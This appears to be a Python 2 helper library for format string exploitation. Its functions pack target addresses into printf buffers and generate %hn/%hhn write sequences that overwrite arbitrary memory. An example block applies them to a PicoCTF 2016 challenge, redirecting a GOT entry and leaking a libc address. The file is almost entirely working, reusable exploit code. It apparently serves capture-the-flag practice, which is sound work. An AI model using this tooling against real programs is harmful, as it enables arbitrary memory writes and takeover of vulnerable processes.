import re
from struct import pack, unpack

def pack_printf_32(fmt, addrs, buf_offset=0):
    ''' Pack a (parameterized) format string with a set of addresses into a printf buffer.
    To be used on systems with 32-bit pointers.
    fmt: a format string with %$XX placeholders for address writes
    addrs: a list of addresses, corresponding to the placeholders in order
    buf_offset: offset to the start of the buffer in bytes relative to the start of the arglist
    '''
    addr_start = (len(fmt) + buf_offset + 3) // 4
    addr_index = [addr_start + 1]
    def replace(m):
        res = '%%%d$' % addr_index[0]
        addr_index[0] += 1
        return res
    fmt = re.sub(r'%..\$', replace, fmt)
    fmt = fmt.ljust((addr_start * 4 - buf_offset), '\0')
    return fmt + pack('<%dI' % len(addrs), *addrs)

def pack_printf_64(fmt, addrs, buf_offset=0):
    ''' Pack a (parameterized) format string with a set of addresses into a printf buffer.
    To be used on systems with 64-bit pointers.
    fmt: a format string with %$XX placeholders for address writes
    addrs: a list of addresses, corresponding to the placeholders in order
    buf_offset: offset to the start of the buffer in bytes relative to the start of the arglist
    '''
    addr_start = (len(fmt) + buf_offset + 7) // 8
    addr_index = [addr_start + 1]
    def replace(m):
        res = '%%%d$' % addr_index[0]
        addr_index[0] += 1
        return res
    fmt = re.sub(r'%..\$', replace, fmt)
    fmt = fmt.ljust((addr_start * 8 - buf_offset), '\0')
    return fmt + pack('<%dQ' % len(addrs), *addrs)

def fmt_writes(writes, out_offset=0):
    ''' Create (fmt, addrs) pair for the given set of writes.
    writes: [(addr, val, sz)] tuples (val is in [0, 65535], sz is in [1,2])
    out_offset: number of bytes already written before this format string '''

    writes = [(addr, (val - out_offset) % (1<<(8*sz)), sz) for addr, val, sz in writes]
    writes.sort(key=lambda x: x[1])

    fmt = []
    addrs = [addr for addr, val, sz in writes]
    prev = 0
    for addr, val, sz in writes:
        diff = val - prev
        assert diff >= 0
        if diff == 1:
            fmt.append('%c')
        elif diff > 1:
            fmt.append('%' + str(diff) + 'c')
        if sz == 1:
            fmt.append('%XX$hhn')
        else:
            fmt.append('%XX$hn')
        prev = val
    return ''.join(fmt), addrs

def gen_writes(addr, data):
    ''' Generate short/byte-sized writes from a block write request. '''
    writes = []
    for i in xrange(0, len(data), 2):
        chunk = data[i:i+2]
        if len(chunk) == 1:
            writes.append((addr+i, unpack('<B', chunk)[0], 1))
        else:
            writes.append((addr+i, unpack('<H', chunk)[0], 2))
    return writes

if __name__ == '__main__':
    # example usage (PicoCTF2016/pwn150-cfgconsole)

    writes = gen_writes(0x601258, pack('<Q', 0x4009bd)[:6]) # exit -> loop
    fmt, addrs = fmt_writes(writes, 6) # account for leak
    # leak address of __libc_start_main
    fmt = '%XX$s' + fmt
    addrs = [0x601228] + addrs
    payload = pack_printf_64(fmt, addrs, 72 + 5) # account for esi, ... registers, stack offset, and "exit "

    print('exit ' + payload)
